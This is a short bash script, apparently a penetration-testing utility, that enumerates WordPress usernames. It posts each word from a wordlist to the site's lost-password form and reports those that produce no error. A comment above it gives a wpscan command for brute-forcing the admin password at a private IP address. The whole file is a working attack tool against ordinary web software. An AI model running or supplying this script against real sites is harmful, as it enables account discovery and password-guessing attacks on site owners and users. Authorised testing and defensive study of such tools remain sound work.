#!/bin/bash
# wpscan --url 10.1.1.137 --wordlist ~/pass.txt --username admin

function usage(){
  echo "### wordpress username enumerator v0.1"
  echo "### by using wordpress' lostpassword function."
  echo ""
  echo "USAGE: $0 <base-url> <wordlist>"
  echo "USAGE: $0 10.1.1.137 users.txt"
}

function main(){
  local base_url=$1
  local wordlist=$2

  for word in $(cat "$wordlist"); do
      if ! curl -s --data "user_login=${word}&redirect_to=&wp-submit=Get+New+Password" "http://${base_url}/wp-login.php?action=lostpassword" | grep -q ERROR; then
          echo "Found valid username: ${word}"
      fi
  done
}

if [ -z $2 ]; then
  usage
else
  main "$@"
fi